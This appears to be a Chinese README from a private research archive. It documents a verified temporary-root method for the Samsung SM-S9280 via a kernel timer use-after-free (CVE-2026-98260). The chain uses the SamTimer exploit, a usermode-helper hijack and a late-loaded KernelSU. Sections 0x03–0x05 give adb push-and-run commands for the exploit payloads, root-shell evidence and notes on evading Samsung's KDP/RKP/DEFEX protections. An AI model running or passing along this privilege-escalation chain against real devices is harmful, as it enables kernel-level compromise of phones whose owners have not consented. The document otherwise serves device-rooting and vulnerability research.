# SamTimer(98260) 实机 root 方法 —— SM-S9280 / S9280ZHU6EZIF 已验证

> 2026-11-07 真机验证：SM-S9280（国行/港版 S24 Ultra，One UI 9.0，kernel
> `6.1.162-android14-11-34343818-abS9280ZHU6EZIF`）用本目录的方法拿到**临时 root**
> （KernelSU，`u:r:ksu:s0`，重启失效）。本目录是**方法归档**，不是自研实现 ——
> exploit 与 late-load 链路由公开项目 SamTimer v1.3 提供，我们做了验证、参数化与集成。
> 自研链路的结项记录见 `cve-2026-98260-uaf/FINAL_REPORT.md`。

## 0x00 结论

| 项 | 值 |
|---|---|
| 漏洞 | CVE-2026-98260（`fs/exec.c` POSIX CPU timer UAF，6.1.y 未修复） |
| exploit | SamTimer v1.3（`RiosWesley/SamTimer`，e3q/EZIF 移植，fork 自 `yoro1836/SamTimer`） |
| 收尾 | UMH 劫持：伪造 workqueue → `call_usermodehelper_exec_work` → 内核以 root 拉起 `uhexec` |
| root 框架 | KernelSU（管理器 v3.3.0 / versionCode 32601；实际加载 KDP 适配模块） |
| 结果 | `su -c id` → `uid=0(root) ... context=u:r:ksu:s0`；`/proc/modules` 有 `kernelsu` Live |
| 持久性 | 每次开机临时 root（late-load，不写 boot/init_boot，BL 锁与验证启动不变） |

## 0x01 链路

```
Shizuku(shell uid 2000) / adb shell
  └─ libtimer umhpipe                # 98260: timer UAF → pipe 读/写原语
       └─ 伪造 work_struct           # func = call_usermodehelper_exec_work
            └─ 内核调用 uhexec(root) # 不写 cred，KDP/RKP/DEFEX 不参与
                 └─ 私有 mount ns 里 bind-mount KDP 补丁版 ksud 覆盖 /system/bin/logcat
                      └─ logcat late-load --allow-shell --package-name me.weishu.kernelsu
                           └─ kernelsu.ko 加载 → 管理器授权 su
```

与自研（GhostLock/43499 系）最大的差别：**SamTimer 完全不改凭据**，所以不撞 KDP
凭据页保护；我们自研链路的 esc 走的是 cred 伪造，正好在 KDP 保护面上，且未打通。
详见 `cve-2026-98260-uaf/FINAL_REPORT.md` 与 `HANDOFF.md`（UMH 方案早有记录，
只是没接到 98260 的 pipe 原语上）。

## 0x02 文件

| 文件 | 大小 | 说明 |
|---|---|---|
| `payloads/libtimer` | 2,213,408 | fork v1.3 `app/src/main/cpp/timer.c`，NDK r29 `aarch64-linux-android34-clang -O2 -static` 编译 |
| `payloads/uhexec` | 2,219,832 | fork v1.3 自带，UMH 回调执行器（root 下 bind-mount + late-load） |
| `payloads/umh_action.sh` | 577 | fork v1.3 自带，uhexec 执行的 late-load 脚本 |
| `payloads/ksud-32601` | 6,028,400 | **KernelSU v3.3.0（32601）多 KMI KDP 版**，内嵌 8 个 KMI 模块（含 `android14-6.1_kernelsu.ko`）；来源 `shangu2003/SamsungRootKit` v1.0.0 |

SHA-256 见 `SHA256SUMS.txt`。上游 fork 自带的 `ksud-s25u-kdp` 是 **3.2.5(32525)** KDP 版；
README 明确警告官方未打 KDP 补丁的 3.3.x LKM 在三星内核上会 panic，因此 32601 必须用
KDP 适配版（本目录这份），不能用官方 `KernelSU_v3.3.0_32601-release.apk` 里的 libksud.so。

## 0x03 手动复现（干净开机状态）

```sh
D=R5CX14VMD7X
A=payloads
adb push $A/libtimer /data/local/tmp/w/libtimer
adb push $A/uhexec   /data/local/tmp/w/uhexec
adb push $A/umh_action.sh /data/local/tmp/w/umh_action.sh
adb push $A/ksud-32601 /data/local/tmp/ksud-s25u-kdp
adb push $A/ksud-32601 /data/local/tmp/.ksud-stage
adb shell 'chmod 755 /data/local/tmp/w/* /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage'
adb shell 'echo 65536 > /sys/kernel/tracing/buffer_size_kb'   # 需要 root 或 shell 可写时
adb shell 'setsid /data/local/tmp/w/libtimer umhpipe > /data/local/tmp/w/run.log 2>&1 < /dev/null &'
# 等 kernelsu live（一般 30–90 秒）
adb shell 'grep kernelsu /proc/modules; su -c id'
```

注意：

1. **不要**跑 `ksud unload` 清模块 —— 2026-11-07 手测时 unload 直接触发重启（可恢复）。
   要重测就整机重启，模块自然不会保留。
2. exploit 成功后 libtimer 会保持 parked（它拿着页），**不能强杀**；重启是唯一清理方式。
3. 首次跑如果看到 "up to 7 mins" 的等待文案，是 App 侧等待窗口；中途杀后台会带走
   Shizuku user service，重新打开再跑即可。

## 0x04 验证证据（2026-11-07 15:50 实测）

```
$ su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ grep kernelsu /proc/modules
kernelsu 217088 1 - Live 0x0000000000000000 (O)

dmesg:
[  793.971391] KernelSU: newfstatat su->ksud!
[  793.972767] KernelSU: sys_execve su found
[  793.972956] KernelSU: Samsung KDP task-scoped credential install pid=11449 uid=0 euid=0

$ getprop ro.boot.verifiedbootstate   # green
$ getprop ro.boot.flash.locked        # 1
$ getenforce                          # Enforcing
```

已加载模块：`gh-hugepage-reserve`、`h_reboot`、`hma_oss_zygisk`、`kp_enhancer`、
`zygisk_vector`、`zygisksu`（HMA/LSPosed 类 hook 模块曾导致 system_server 反复崩：
熄屏 `SCREEN_OFF` 广播派发时 `DeadObjectException` → `FATAL EXCEPTION IN SYSTEM PROCESS`，
建议 root 后禁用这些 hook 模块）。

## 0x05 KDP patch 说明（为什么 32601 必须用 KDP 版）

- **exploit 本身不需要 patch 内核**：UMH 路线不写凭据、不写内核文本，KDP/RKP/DEFEX 不参与。
- **需要 KDP 适配的是 `kernelsu.ko`**（KSU 给 App 发 root 时要写凭据）：
  - `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y`（RKP 禁止 live patch_text）
  - KDP task-scoped RO cred 安装：`prepare_ro_creds` + `kdp_assign_pgd`；
    释放用 `kdp_usecount_dec_and_test` + `__put_cred`
  - DEFEX kprobe 同步
- 补丁来源参考：`polygraphene/KernelSU` 的 `kdp-612-3.3.0` 分支（DFReroot README 指定）；
  本地 3.2.5 版补丁见 `Root-My-Galaxy-Payloads/kernelsu/patches/`（37 KB）。
- 本目录的 `ksud-32601` 就是 **3.3.0 + KDP 模块** 的多 KMI 统一版（字符串内含 `32601`）。

## 0x06 已集成到 RootMyS24

- `RootMyS24` commit `80c5742`：新增 `Engine.SAMTIMER_98260`、
  `S9280ZHU6EZIF` 画像切换到 SamTimer 引擎、`runSamTimer98260()`（暂存→抬 trace buffer
  →跑 umhpipe→轮询 `/proc/modules`）
- commit `560892b`：固件选择页新增「提权引擎」分段选项卡（GhostLock 43499 / SamTimer 98260），
  偏好持久化 `engine_pref`，默认跟随固件条目
- 内置资产与 `payloads/` 完全一致（`assets/samtimer/`）

## 0x07 风险与许可

- `RiosWesley/SamTimer` 与 `shangu2003/SamsungRootKit` **都没有 LICENSE 文件**
  （保留所有权利）→ 本目录仅作**私有研究归档**，公开分发/上架前必须替换或取得授权
- 依赖公开实现意味着方法可能随上游变更失效；自研 UMH 收尾移植是后续彻底自主的路径
- late-load 后每次开机都要重跑；KSU 模块与 hook 框架混用有崩溃风险（见 0x04）

## 0x08 参考

- 上游：<https://github.com/yoro1836/SamTimer>；fork：<https://github.com/RiosWesley/SamTimer>（tag v1.3）
- 多 KMI KDP ksud：<https://github.com/shangu2003/SamsungRootKit>（v1.0.0）
- KDP 适配补丁分支：`polygraphene/KernelSU` → `kdp-612-3.3.0`
- 自研结项：`cve-2026-98260-uaf/FINAL_REPORT.md`、`HANDOFF.md`
